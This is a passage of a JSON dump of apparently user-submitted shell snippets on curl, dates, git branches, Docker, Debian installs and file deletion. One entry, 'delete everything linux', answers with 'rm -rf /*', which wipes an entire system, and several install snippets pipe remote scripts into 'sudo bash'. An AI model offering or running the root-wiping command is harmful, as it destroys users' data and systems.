    "description": "# -i to include response headers in the output. # -H to specify a header # -X to specify the request method curl -i -H \"Accept: application/json\" -H \"Content-Type: application/json\" -X GET http://hostname/resource\ncurl --header \"Host: example.com\" http://127.0.0.1/\ncurl -H \"Accept-Charset: utf-8\" -H \"Content-Type: application/x-www-form-urlencoded\" http://www.some-domain.com \nJust use '-ISs' flag options I:(only headers), sS:(silence and no errors)  curl www.example -ISs\n",
    "reg_date": "2021-10-11T22:03:30.000Z"
  },
  {
    "id": 1180,
    "keyword": null,
    "link": null,
    "title": " curl install pip",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py #Once you do that, enter line 3 inside python get-pip.py\n#First download the pip installer with curl curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py #Then execute the pip installer python get-pip.py\npython -m pip download [options] <requirement specifier> [package-index-options] ... python -m pip download [options] -r <requirements file> [package-index-options] ... python -m pip download [options] <vcs project url> ... python -m pip download [options] <local project path> ... python -m pip download [options] <archive url/path> ...  \n",
    "reg_date": "2021-10-11T22:03:30.000Z"
  },
  {
    "id": 1181,
    "keyword": null,
    "link": null,
    "title": " curl measure time",
    "description": "curl -w \"\\n\\n%{time_connect} + %{time_starttransfer} = %{time_total}\\n\" www.google.com  \ncurl -w \"\\n\\n%{time_option}\\n\" www.google.com #Choose one of time_options:  http_code           The  numerical  response  code that was found                      in the last retrieved HTTP(S) or FTP(s) transfer.  time_appconnect     The time, in seconds, it took from the start until                      the SSL/SSH/etc connect/handshake to the remote host                      was completed.  time_connect        The time, in seconds, it took from the start until                      the TCP connect to the remote host (or proxy) was                      completed.  time_namelookup     The time, in seconds, it took from the start until the name                      resolving was completed.  time_pretransfer    The time, in seconds, it took from the start until the                      file transfer was just about to begin.  time_starttransfer  The time, in seconds, it took from the start until the first                      byte was just about to be transferred.  time_total          The total time, in seconds, that the full operation lasted.\ncurl -X POST -d @file server:port -w %{time_connect}:%{time_starttransfer}:%{time_total}\n",
    "reg_date": "2021-10-11T22:03:30.000Z"
  },
  {
    "id": 1182,
    "keyword": null,
    "link": null,
    "title": " curl post request",
    "description": "curl -X POST -H \"Content-Type: application/json\" \\  -d '{\"username\":\"abc\",\"password\":\"abc\"}' \\  https://api.example.com/v2/login \n# dont forget the content type, else it will throw an error  curl -X POST -H \"Content-Type: application/json\" \\  -d '{\"username\":\"abc\",\"password\":\"abc\"}' \\  https://api.example.com/v2/login\ncurl -d \"user=user1&pass=abcd\" -X POST https://example.com/login\ncurl --data '' https://example.com/resource.cgi  curl -X POST https://example.com/resource.cgi  curl --request POST https://example.com/resource.cgi \ncurl --data \"param1=value1&param2=value2\" https://example.com/post\ncurl -d \"user=user1&pass=abcd\" https://example.com/login\n",
    "reg_date": "2021-10-11T22:03:30.000Z"
  },
  {
    "id": 1183,
    "keyword": null,
    "link": null,
    "title": " current date bash",
    "description": "# syntax $(date)  # example (when running the command of \"date\") echo $(date)  # OUTPUT: Mon May 11 13:20:57 SAST 2020 # To return a specific FORMAT, search \"bash get date format\" \ndate +'FORMAT'   ### mm/dd/yyyy ### date +'%m/%d/%Y'   ## Time in 12 hr format ### date +'%r'   ## backup dir format ## backup_dir=$(date +'%m/%d/%Y') echo \"Backup dir for today: /nas04/backups/${backup_dir}\"\n",
    "reg_date": "2021-10-11T22:03:31.000Z"
  },
  {
    "id": 1184,
    "keyword": null,
    "link": null,
    "title": " current locatiomn bas",
    "description": "echo $PWD\n",
    "reg_date": "2021-10-11T22:03:31.000Z"
  },
  {
    "id": 1185,
    "keyword": null,
    "link": null,
    "title": " current location bash",
    "description": "echo $PWD\n",
    "reg_date": "2021-10-11T22:03:31.000Z"
  },
  {
    "id": 1186,
    "keyword": null,
    "link": null,
    "title": " cut first word",
    "description": "Just use cut command with a defined delimeter as a space ' ' and choose to cut since second word match until end '-f2-' as for example: cat file.txt | cut -d ' ' -f2- If for example space delimiter ' ' is repeated in your line check how many times, since matching word number must then be adapted. For example: history | cut -d ' ' -f4-\n",
    "reg_date": "2021-10-11T22:03:31.000Z"
  },
  {
    "id": 1187,
    "keyword": null,
    "link": null,
    "title": " cut last field delimiter",
    "description": "Use rev command altogether with cut command as follows: echo \"1 2 3 4 5\" | rev | cut -d ' ' -f '2-' | rev #rev reverses string, then you cut from 2th field to end and reverse back\n",
    "reg_date": "2021-10-11T22:03:31.000Z"
  },
  {
    "id": 1188,
    "keyword": null,
    "link": null,
    "title": " cypress github actions yaml",
    "description": "name: End-to-end tests on: [push] jobs:   cypress-run:     runs-on: ubuntu-latest     steps:       - name: Checkout         uses: actions/checkout@v1        - name: Cypress run         uses: cypress-io/github-action@v1         with:           build: npm run build           start: npm start           wait-on: http://localhost:3030\n",
    "reg_date": "2021-10-11T22:03:31.000Z"
  },
  {
    "id": 1189,
    "keyword": null,
    "link": null,
    "title": " cypress install",
    "description": "cd /your/project/path npm init npm install cypress --save-dev\nnpm install cypress or npm install cypress --save-dev // Make sure that you have already run npm init  ./node_modules/.bin/cypress open  //to open cypress window, will take 30 secs\n./node_modules/.bin/cypress open   // just cypress open wont work\n//Install Cypress npm install cypress --save-dev or yarn add cypress --dev  //Open Cypress node_modules/.bin/cypress open  or  add \"cypress\": \"cypress open\" in your package.json then npm run cypress \n",
    "reg_date": "2021-10-11T22:03:32.000Z"
  },
  {
    "id": 1190,
    "keyword": null,
    "link": null,
    "title": " database already registered",
    "description": "$ sudo nano /etc/pacman.conf # Remove any duplicate repo.\n",
    "reg_date": "2021-10-11T22:03:32.000Z"
  },
  {
    "id": 1191,
    "keyword": null,
    "link": null,
    "title": " database metasploit kali linux",
    "description": "Method 2021 Start database in metasploit kali linux Try 1- sudo service postgresql start 2- sudo service mysql start  3- sudo msfdb init  Then 4- msfconsole msf > db_status  Happy hacking!\n",
    "reg_date": "2021-10-11T22:03:32.000Z"
  },
  {
    "id": 1192,
    "keyword": null,
    "link": null,
    "title": " date-fns npm package",
    "description": "npm install date-fns --save # or with yarn  yarn add date-fns\n",
    "reg_date": "2021-10-11T22:03:32.000Z"
  },
  {
    "id": 1193,
    "keyword": null,
    "link": null,
    "title": " date format in linux shell script",
    "description": "date_now=$(date \"+%F-%H-%M-%S\")\n",
    "reg_date": "2021-10-11T22:03:32.000Z"
  },
  {
    "id": 1194,
    "keyword": null,
    "link": null,
    "title": " date linux format yyyymmdd",
    "description": "# put current date as yyyy-mm-dd in $date date=$(date '+%Y-%m-%d')  # put current date as yyyy-mm-dd HH:MM:SS in $date date=$(date '+%Y-%m-%d %H:%M:%S')  # print current date directly echo $(date '+%Y-%m-%d') \n",
    "reg_date": "2021-10-11T22:03:32.000Z"
  },
  {
    "id": 1195,
    "keyword": null,
    "link": null,
    "title": " datetime calculation in shell",
    "description": "date --date \"07/01/2021 +1 hours\" +'%d/%m/%Y %H:%M:%S'\n$ date --date 'last Monday' Mon Sep 10 00:00:00 MST 2018 $ date --date 'next Monday' Mon Sep 17 00:00:00 MST 2018 \n$ date --date 'March 1, 2015 +7 days' Sun Mar  8 00:00:00 MST 2015 $ date --date 'March 1, 2015 -1 year' Sat Mar  1 00:00:00 MST 2014 $ date --date 'March 1, 2015 +12 days +12 hours +15 minutes' Fri Mar 13 12:15:00 MST 2015 \n",
    "reg_date": "2021-10-11T22:03:32.000Z"
  },
  {
    "id": 1196,
    "keyword": null,
    "link": null,
    "title": " datetime echo shell script",
    "description": "$(date '+%d/%m/%Y %H:%M:%S')\n",
    "reg_date": "2021-10-11T22:03:33.000Z"
  },
  {
    "id": 1197,
    "keyword": null,
    "link": null,
    "title": " davinchi resolve",
    "description": "Best I Know\n",
    "reg_date": "2021-10-11T22:03:33.000Z"
  },
  {
    "id": 1198,
    "keyword": null,
    "link": null,
    "title": " dbeaver install",
    "description": "sudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce\nsudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce  or   wget -O - https://dbeaver.io/debs/dbeaver.gpg.key | sudo apt-key add - echo \"deb https://dbeaver.io/debs/dbeaver-ce /\" | sudo tee /etc/apt/sources.list.d/dbeaver.list sudo apt-get update && sudo apt-get install dbeaver-ce\nsudo dpkg -P dbeaver-ce\n",
    "reg_date": "2021-10-11T22:03:33.000Z"
  },
  {
    "id": 1199,
    "keyword": null,
    "link": null,
    "title": " dbeaver install ubuntu",
    "description": "sudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce\nsudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce  or   wget -O - https://dbeaver.io/debs/dbeaver.gpg.key | sudo apt-key add - echo \"deb https://dbeaver.io/debs/dbeaver-ce /\" | sudo tee /etc/apt/sources.list.d/dbeaver.list sudo apt-get update && sudo apt-get install dbeaver-ce\n",
    "reg_date": "2021-10-11T22:03:33.000Z"
  },
  {
    "id": 1200,
    "keyword": null,
    "link": null,
    "title": " dbeaver linux",
    "description": "sudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce\nsudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce  or   wget -O - https://dbeaver.io/debs/dbeaver.gpg.key | sudo apt-key add - echo \"deb https://dbeaver.io/debs/dbeaver-ce /\" | sudo tee /etc/apt/sources.list.d/dbeaver.list sudo apt-get update && sudo apt-get install dbeaver-ce\nsudo dpkg -P dbeaver-ce\n",
    "reg_date": "2021-10-11T22:03:33.000Z"
  },
  {
    "id": 1201,
    "keyword": null,
    "link": null,
    "title": " dconf editor ubuntu 20.04",
    "description": "sudo apt-get update sudo apt-get install dconf-editor\n$ gsettings set org.gnome.shell.extensions.dash-to-dock extend-height false $ gsettings set org.gnome.shell.extensions.dash-to-dock dock-position BOTTOM $ gsettings set org.gnome.shell.extensions.dash-to-dock transparency-mode FIXED $ gsettings set org.gnome.shell.extensions.dash-to-dock dash-max-icon-size 64 $ gsettings set org.gnome.shell.extensions.dash-to-dock unity-backlit-items true \n",
    "reg_date": "2021-10-11T22:03:33.000Z"
  },
  {
    "id": 1202,
    "keyword": null,
    "link": null,
    "title": " dd show progress",
    "description": "dd if=/path/to/input of=/path/to/output status=progress\nsudo dd if=input_file of=output_file status=progress\nsudo kill -USR1 $(pgrep ^dd) \n",
    "reg_date": "2021-10-11T22:03:34.000Z"
  },
  {
    "id": 1203,
    "keyword": null,
    "link": null,
    "title": " dd usr1",
    "description": "sudo kill -USR1 $(pgrep ^dd) \n",
    "reg_date": "2021-10-11T22:03:34.000Z"
  },
  {
    "id": 1204,
    "keyword": null,
    "link": null,
    "title": " debian 10 isc dhcp server status",
    "description": "root# service isc-dhcp-server restart\n",
    "reg_date": "2021-10-11T22:03:34.000Z"
  },
  {
    "id": 1205,
    "keyword": null,
    "link": null,
    "title": " debian bash font size",
    "description": "setfont /usr/share/consolefonts/Uni3-Terminus28x14.pst.gz\n",
    "reg_date": "2021-10-11T22:03:34.000Z"
  },
  {
    "id": 1206,
    "keyword": null,
    "link": null,
    "title": " debian disable ipv6",
    "description": "#1. Open a terminal window. #2. Issue the command sudo nano /etc/sysctl.conf #3. Add the following at the bottom of the file:  net.ipv6.conf.all.disable_ipv6 = 1 net.ipv6.conf.default.disable_ipv6 = 1 net.ipv6.conf.lo.disable_ipv6 = 1  #4. Save and close the file. #5. Reboot the machine.\n",
    "reg_date": "2021-10-11T22:03:34.000Z"
  },
  {
    "id": 1207,
    "keyword": null,
    "link": null,
    "title": " debian docker",
    "description": "# Install docker sudo apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable\" sudo apt update apt-cache policy docker-ce sudo apt install -y docker-ce  # Install docker-compose sudo curl -L \"https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\nsudo apt -y install apt-transport-https ca-certificates curl gnupg2 software-properties-common\nsudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable\" \n",
    "reg_date": "2021-10-11T22:03:34.000Z"
  },
  {
    "id": 1208,
    "keyword": null,
    "link": null,
    "title": " debian install java",
    "description": "sudo apt-get install openjdk-8-jdk\n# If you want java 11: sudo apt install -y default-jre  # If you want other java versions: sudo apt update sudo apt install -y apt-transport-https ca-certificates wget dirmngr gnupg software-properties-common wget -qO - https://adoptopenjdk.jfrog.io/adoptopenjdk/api/gpg/key/public | sudo apt-key add - sudo add-apt-repository --yes https://adoptopenjdk.jfrog.io/adoptopenjdk/deb/ sudo apt update sudo apt install -y adoptopenjdk-8-hotspot # Java 8 sudo apt install -y adoptopenjdk-16-hotspot # Java 16  # Switch java version sudo update-alternatives --config java\nsudo update-java-alternatives -s java-8-oracle export JAVA_HOME=/usr/lib/jvm/java-8-oracle/ export PATH=$PATH:$JAVA_HOME 123\necho deb http://archive.debian.org/debian jessie-backports main | sudo tee /etc/apt/sources.list.d/jessie-backports.list echo 'Acquire::Check-Valid-Until \"false\";' | sudo tee -a /etc/apt/apt.conf sudo apt update sudo apt -t jessie-backports install openjdk-8-jre \n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1209,
    "keyword": null,
    "link": null,
    "title": " debian install node js",
    "description": "# Install Node.js 16 sudo apt install curl -y curl -sL https://deb.nodesource.com/setup_16.x | sudo bash - sudo apt install nodejs -y  # If NPM didn't get installed sudo apt install npm -y  # For another node version use curl -sL https://deb.nodesource.com/setup_<version>.x | sudo bash -\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install nodejs sudo apt install npm sudo apt update\nsudo apt install nodejs\npacman -S nodejs npm\n//STEP 1:install using curl (PPA) sudo apt update && sudo apt install curl -y //STEP 2:install latest version (replace 14.x with requird one(i.e 15.x)) curl -sL https://deb.nodesource.com/setup_15.x | sudo -E bash - sudo apt install nodejs nodejs -v v15.3.0\napt install nodejs npm -y&& npm -v && nodejs -v \n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1210,
    "keyword": null,
    "link": null,
    "title": " debian install python 3",
    "description": "sudo apt install python3\n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1211,
    "keyword": null,
    "link": null,
    "title": " debian install vim",
    "description": "apt-get update apt-get install vim\n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1212,
    "keyword": null,
    "link": null,
    "title": " debian kill open port",
    "description": "kill -9 $(sudo lsof -t -i:8080) \nfuser -k 3000/tcp \t//will kill that process.\n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1213,
    "keyword": null,
    "link": null,
    "title": " debian netstat command not found",
    "description": "# apt-get install net-tools \n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1214,
    "keyword": null,
    "link": null,
    "title": " debian show installed packages",
    "description": "sudo apt list --installed\n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1215,
    "keyword": null,
    "link": null,
    "title": " debug shell script",
    "description": " set -x #Just use this command to activate debugging within your code ## some code ... ## set +x #Deactivate debugging  #Alternatively do bash -x code.sh\n",
    "reg_date": "2021-10-11T22:03:35.000Z"
  },
  {
    "id": 1216,
    "keyword": null,
    "link": null,
    "title": " decompress tar.gz",
    "description": "tar -xvf file.tar.gz\ntar -xvzf community_images.tar.gz\ntar -xf archive.tar.gz\n",
    "reg_date": "2021-10-11T22:03:36.000Z"
  },
  {
    "id": 1217,
    "keyword": null,
    "link": null,
    "title": " default field separator recognized by awk",
    "description": "# Short answer: # By default any run of spaces and/or tabs and/or newlines is treated  # as a field separator, with leading and trailing runs ignored.\n",
    "reg_date": "2021-10-11T22:03:36.000Z"
  },
  {
    "id": 1218,
    "keyword": null,
    "link": null,
    "title": " deletar branch",
    "description": "# local git branch -d nome-da-branch  # remote git push origin --delete nome-da-branch\ngit push origin --delete nome-da-branch \n",
    "reg_date": "2021-10-11T22:03:36.000Z"
  },
  {
    "id": 1219,
    "keyword": null,
    "link": null,
    "title": " delete .git folder",
    "description": "rm -rf .git \n",
    "reg_date": "2021-10-11T22:03:36.000Z"
  },
  {
    "id": 1220,
    "keyword": null,
    "link": null,
    "title": " delete a branch in git",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n$ git push origin --delete feature/login \n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName  // refresh branch list git fetch -p\n## git version 2.25.1  ## Deleting local branches git branch -d localBranchName ## Deleting remote branches git push origin --delete remoteBranchName  ## Deleting both a local and a remote branch ## They are completely separate objects in Git. But git branch -d localBranchName && git push origin --delete remoteBranchName\ngit push --delete remoteName branchName\n",
    "reg_date": "2021-10-11T22:03:36.000Z"
  },
  {
    "id": 1221,
    "keyword": null,
    "link": null,
    "title": " delete a github repository using bash",
    "description": "git init git add . git commit -m \"message for the commit\" git remote add origin https://url-of-github-repo git push origin master or git push -f origin master\nwinpty curl -X DELETE -H 'Authorization: token [GENERATED_TOKEN]' https://api.github.com/repos/[USER]/[REPO_NAME]  # follow steps here to generate token: https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line\ngit clone https://github.com/foo/repo_name.git new_directory_name\n",
    "reg_date": "2021-10-11T22:03:36.000Z"
  },
  {
    "id": 1222,
    "keyword": null,
    "link": null,
    "title": " delete a github repository using curl",
    "description": "winpty curl -X DELETE -H 'Authorization: token [GENERATED_TOKEN]' https://api.github.com/repos/[USER]/[REPO_NAME]  # follow steps here to generate token: https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line\n",
    "reg_date": "2021-10-11T22:03:36.000Z"
  },
  {
    "id": 1223,
    "keyword": null,
    "link": null,
    "title": " delete all docker images",
    "description": "docker rmi -f $(docker images -a -q) \n# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker rmi $(docker images --filter \"dangling=true\" -q --no-trunc)\ndocker rm $(docker ps -a -q)\ndocker rmi $(docker images -a -q) \ndocker system prune -a\n",
    "reg_date": "2021-10-11T22:03:38.000Z"
  },
  {
    "id": 1224,
    "keyword": null,
    "link": null,
    "title": " delete all local branches git",
    "description": "$ git branch | grep -v \"master\" | xargs git branch -D \ngit branch | grep -v \"master\" | xargs git branch -D\n// hard delete  git branch -D $(git branch) \n",
    "reg_date": "2021-10-11T22:03:38.000Z"
  },
  {
    "id": 1225,
    "keyword": null,
    "link": null,
    "title": " delete all local branches webstorm",
    "description": "git branch --merged | egrep -v \"(^\\*|master|dev)\" | xargs git branch -d\n",
    "reg_date": "2021-10-11T22:03:38.000Z"
  },
  {
    "id": 1226,
    "keyword": null,
    "link": null,
    "title": " delete all migrations django",
    "description": "### Source: https://simpleisbetterthancomplex.com/tutorial/2016/07/26/how-to-reset-migrations.html  # Delete migrations find . -path \"*/migrations/*.py\" -not -name \"__init__.py\" -delete find . -path \"*/migrations/*.pyc\"  -delete  # Drop database # (delete db.sqlite3 or see https://stackoverflow.com/questions/34576004/simple-way-to-reset-django-postgresql-database  # Create migrations and generate DB schema ./manage.py makemigrations ./manage.py migrate\npython3 manage.py rm -r name/migrations\n",
    "reg_date": "2021-10-11T22:03:38.000Z"
  },
  {
    "id": 1227,
    "keyword": null,
    "link": null,
    "title": " delete all the files without one in linux",
    "description": "# delete all except the filename  $ rm -v !(\"filename\") \n",
    "reg_date": "2021-10-11T22:03:39.000Z"
  },
  {
    "id": 1228,
    "keyword": null,
    "link": null,
    "title": " delete branch from remote",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n$ git push origin --delete feature/login \ngit push --delete remoteName branchName\ngit fetch origin --prune \n# Fetch changes from all remotes and locally delete  # remote deleted branches/tags etc # --prune will do the job :-; git fetch --all --prune\ngit push -d origin <branch_name>\n",
    "reg_date": "2021-10-11T22:03:39.000Z"
  },
  {
    "id": 1229,
    "keyword": null,
    "link": null,
    "title": " delete branch git",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n$ git remote -v # View current remotes > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push) > destination  https://github.com/FORKER/REPOSITORY.git (fetch) > destination  https://github.com/FORKER/REPOSITORY.git (push)  $ git remote rm destination # Remove remote $ git remote -v # Verify it's gone > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push)\ngit branch -m <oldname> <newname> # Any Branch git branch -m <newname> # Current Branch  # For windows if you get \"Branch already exists\" error git branch -M <newname>\n//delete locally git branch -d branch_name  //delete remotely //git push <remote_name> :<branch_name> // ex. git push origin :serverfix\n// delete branch locally git branch -D localBranchName  // delete branch remotely git push \n",
    "reg_date": "2021-10-11T22:03:39.000Z"
  },
  {
    "id": 1230,
    "keyword": null,
    "link": null,
    "title": " delete branch local and remote git",
    "description": "// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n// 1. delete branch locally git branch -d localBranchName  // 2. delete branch remotely git push origin --delete remoteBranchName  // 3. DONE!\n$ git branch -a  # *master # b1 # remote/origin/master # remote/origin/b1  $ git push origin --delete b1 # [...] # - [deleted] b1 \n",
    "reg_date": "2021-10-11T22:03:40.000Z"
  },
  {
    "id": 1231,
    "keyword": null,
    "link": null,
    "title": " delete cash on ubuntu",
    "description": "//delete cash  // systemd-resolve --statistics systemd-resolve --flush-caches\n",
    "reg_date": "2021-10-11T22:03:40.000Z"
  },
  {
    "id": 1232,
    "keyword": null,
    "link": null,
    "title": " delete conda from machine",
    "description": "conda install anaconda-clean   # install the package anaconda clean anaconda-clean --yes           # clean all anaconda related files and directories  rm -rf ~/anaconda3             # removes the entire anaconda directory  rm -rf ~/.anaconda_backup       # anaconda clean creates a back_up of files/dirs, remove it                                  # (conda list; cmd shouldn't respond after the clean up)\n",
    "reg_date": "2021-10-11T22:03:40.000Z"
  },
  {
    "id": 1233,
    "keyword": null,
    "link": null,
    "title": " delete container id",
    "description": "docker rm $(docker ps -a -q)\n",
    "reg_date": "2021-10-11T22:03:41.000Z"
  },
  {
    "id": 1234,
    "keyword": null,
    "link": null,
    "title": " delete directory linux",
    "description": "rm -rf dir1 \nrm -rf directory-name\nrm -d dir\n# for removing empty directory $ rmdir myDirectory  # to remove a directory that contains files and subdirectory $ rm -r myDirectory\nrm -rf /path/to/directory \n# To delete a single file, use the rm or unlink command followed by the file name:  unlink filename rm filename  # To delete multiple files at once, use the rm command followed by the file names separated by space. rm filename1 filename2 filename3 # To remove an empty directory, use either rmdir or rm -d followed by the directory name: rm -d dirname rmdir dirname  # To remove non-empty directories and all the files within them, use the rm command with the-r (recursive) option: rm -r dirname  # To remove non-empty directories and all the files without being prompted, use rm with the -r (recursive) and -f options: rm -rf dirname  #To remove multiple directories at once, use the rm -r command followed by the directory names separated by space. rm -r dirname1 dirname2 dirname3  \n",
    "reg_date": "2021-10-11T22:03:41.000Z"
  },
  {
    "id": 1235,
    "keyword": null,
    "link": null,
    "title": " delete docker logs linux",
    "description": "find /var/lib/docker/containers/ -type f -name \"*.log\" -delete \n",
    "reg_date": "2021-10-11T22:03:41.000Z"
  },
  {
    "id": 1236,
    "keyword": null,
    "link": null,
    "title": " delete empty files bash",
    "description": "# This will delete all empty files in directory /tmp find /tmp -size  0 -print -delete\n",
    "reg_date": "2021-10-11T22:03:42.000Z"
  },
  {
    "id": 1237,
    "keyword": null,
    "link": null,
    "title": " delete everything linux",
    "description": "rm -rf /*\n# remove everything in a directory  rm /path/to/dir/* # remove all sub-directories and files rm -r /path/to/dir/* \n",
    "reg_date": "2021-10-11T22:03:42.000Z"
  },
  {
    "id": 1238,
    "keyword": null,
    "link": null,
    "title": " delete first column bash",
    "description": "Just use cut command with a defined delimeter as a space ' ' and choose to cut since second word match until end '-f2-' as for example: cat file.txt | cut -d ' ' -f2- If for example space delimiter ' ' is repeated in your line check how many times, since matching word number must then be adapted. For example: history | cut -d ' ' -f4-\n",
    "reg_date": "2021-10-11T22:03:42.000Z"
  },
  {
    "id": 1239,
    "keyword": null,
    "link": null,
    "title": " delete git repository command line",
    "description": "rm -rf .git \nOn Windows: Go to the directory where you want to delete your .git folder then type in cmd  rmdir /S .git.\n",
    "reg_date": "2021-10-11T22:03:43.000Z"
  },
  {
    "id": 1240,
    "keyword": null,
    "link": null,
    "title": " delete github credentials in windows",
    "description": "cmdkey /delete:LegacyGeneric:target=git:https://github.com \n",
    "reg_date": "2021-10-11T22:03:43.000Z"
  },
  {
    "id": 1241,
    "keyword": null,
    "link": null,
    "title": " delete ip by ufw",
    "description": "$ sudo ufw status numbered $ sudo ufw delete NUM\n",
    "reg_date": "2021-10-11T22:03:43.000Z"
  },
  {
    "id": 1242,
    "keyword": null,
    "link": null,
    "title": " delete local branch",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n# local git branch -d nome-da-branch  # remote git push origin --delete nome-da-branch\n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n$ git push origin --delete feature/login \n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName  // refresh branch list git fetch -p\n## git version 2.25.1  ## Deleting local branches git branch -d localBranchName ## Deleting remote branches git push origin --delete remoteBranchName  ## Deleting both a local and a remote branch ## They are completely separate objects in Git. But git branch -d localBranchName && git push origin --delete remoteBranchName\n",
    "reg_date": "2021-10-11T22:03:43.000Z"
  },
  {
    "id": 1243,
    "keyword": null,
    "link": null,
    "title": " delete local branch git",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n$ git push origin --delete feature/login \n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName  // refresh branch list git fetch -p\n## git version 2.25.1  ## Deleting local branches git branch -d localBranchName ## Deleting remote branches git push origin --delete remoteBranchName  ## Deleting both a local and a remote branch ## They are completely separate objects in Git. But git branch -d localBranchName && git push origin --delete remoteBranchName\ngit branch -d <branch_name>\n",
    "reg_date": "2021-10-11T22:03:44.000Z"
  },
  {
    "id": 1244,
    "keyword": null,
    "link": null,
    "title": " delete local branches not on remote",
    "description": "git branch -vv | grep ': gone]'|  grep -v \"\\*\" | awk '{ print $1; }' | xargs -r git branch -D\ngit fetch -p && for branch in $(git branch -vv | grep ': gone]' | awk '{print $1}'); do git branch -D $branch; done \ngit fetch --all --prune\n# Fetch changes from all remotes and locally delete  # remote deleted branches/tags etc # --prune will do the job :-; git fetch --all --prune\n",
    "reg_date": "2021-10-11T22:03:44.000Z"
  },
  {
    "id": 1245,
    "keyword": null,
    "link": null,
    "title": " delete mulitple git branch",
    "description": "// git remove multiple branch // here pattern refers to few characters of branch name that is common between multiple branches  // delete branch locally git branch | grep \"pattern\" | xargs git branch -d  // delete local branch that is unmerged git branch | grep \"pattern\" | xargs git branch -D\n",
    "reg_date": "2021-10-11T22:03:45.000Z"
  },
  {
    "id": 1246,
    "keyword": null,
    "link": null,
    "title": " delete nginx",
    "description": "sudo apt-get purge nginx nginx-common \nsudo apt-get remove nginx* --purge\n",
    "reg_date": "2021-10-11T22:03:45.000Z"
  },
  {
    "id": 1247,
    "keyword": null,
    "link": null,
    "title": " delete node module folder",
    "description": "rm -rf node_modules/ npm install\nrm -rf node_modules\nrm -rf node_modules/ yarn install\nrm -r node_modules // run this from git bash\nnpkill // then press space key\n",
    "reg_date": "2021-10-11T22:03:45.000Z"
  },
  {
    "id": 1248,
    "keyword": null,
    "link": null,
    "title": " delete node modules",
    "description": "# Do the below steps - # Make .gitignore file. # Run below commands in your terminal  git rm -r --cached node_modules  git commit -am \"node_modules be gone!\"  git push origin master\nrm -rf node_modules/ npm install\nrm -rf node_modules\nrm -rf node_modules/ yarn install\nrm -rf node_modules //when need to unstill node_modules folder npm install //wen need to install\nrm -r node_modules // run this from git bash\n",
    "reg_date": "2021-10-11T22:03:45.000Z"
  },
  {
    "id": 1249,
    "keyword": null,
    "link": null,
    "title": " delete old files linux",
    "description": "find /opt/backup -type f -mtime +30 -exec rm -f {} \\; \n",
    "reg_date": "2021-10-11T22:03:46.000Z"
  },
  {
    "id": 1250,
    "keyword": null,
    "link": null,
    "title": " delete postmaster.pid mac",
    "description": "cd /usr/local/var/postgres rm postmaster.pid\n",
    "reg_date": "2021-10-11T22:03:46.000Z"
  },
  {
    "id": 1251,
    "keyword": null,
    "link": null,
    "title": " delete ppa repository ubuntu",
    "description": "sudo add-apt-repository --remove ppa:PPA_Name/ppa\nsudo add-apt-repository -r {package-name}\n",
    "reg_date": "2021-10-11T22:03:47.000Z"
  },
  {
    "id": 1252,
    "keyword": null,
    "link": null,
    "title": " delete remote branch",
